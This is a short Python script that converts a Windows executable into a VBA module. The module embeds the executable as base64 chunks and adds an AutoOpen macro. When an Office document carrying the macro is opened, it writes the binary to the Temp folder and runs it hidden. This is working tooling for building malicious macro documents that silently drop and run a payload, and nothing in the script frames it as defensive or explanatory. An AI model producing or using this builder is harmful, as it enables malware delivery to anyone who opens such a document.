import base64

def exe_to_vba(exe_file, output_file="vba_code.bas", var_name="base64Data", chunk_size=200):
    # Read the binary content of the .exe file and encode it in Base64
    with open(exe_file, 'rb') as f:
        base64_data = base64.b64encode(f.read()).decode('utf-8')

    # Write the Base64 data into a .bas file as VBA code
    with open(output_file, 'w') as f:
        f.write('Attribute VB_Name = "Module1"\n')  # Add module name attribute
        f.write(f'Dim {var_name} As String\n')
        chunks = [base64_data[i:i+chunk_size] for i in range(0, len(base64_data), chunk_size)]
        for i, chunk in enumerate(chunks):
            if i == 0:
                f.write(f'{var_name} = "{chunk}"\n')
            else:
                f.write(f'{var_name} = {var_name} & "{chunk}"\n')

        f.write("\nSub AutoOpen()\n")
        f.write(f'    Dim exePath As String\n')
        f.write(f'    exePath = Environ("Temp") & "\\{exe_file.split("/")[-1]}"\n')  # Corrected to use the filename only
        f.write(f'    Dim fileNum As Integer\n')
        f.write(f'    fileNum = FreeFile\n')
        f.write(f'    Open exePath For Binary As #fileNum\n')
        f.write(f'    Put #fileNum, , DecodeBase64({var_name})\n')
        f.write(f'    Close #fileNum\n')
        f.write(f'    Shell exePath, vbHide\n')
        f.write("End Sub\n\n")

        f.write("Function DecodeBase64(base64String As String) As Byte()\n")
        f.write("    Dim xml As Object\n")
        f.write("    Set xml = CreateObject(\"MSXML2.DOMDocument.6.0\")\n")
        f.write("    Dim node As Object\n")
        f.write("    Set node = xml.createElement(\"b64\")\n")
        f.write("    node.DataType = \"bin.base64\"\n")
        f.write("    node.Text = base64String\n")
        f.write("    DecodeBase64 = node.nodeTypedValue\n")
        f.write("End Function\n")

    print(f"[+] VBA code written to {output_file}. You can import this file into the VBA editor.")

if __name__ == "__main__":
    # Provide the full path to the .exe file
    exe_to_vba("/home/alpha12/Documents/win64file")  # Convert .exe to .bas file
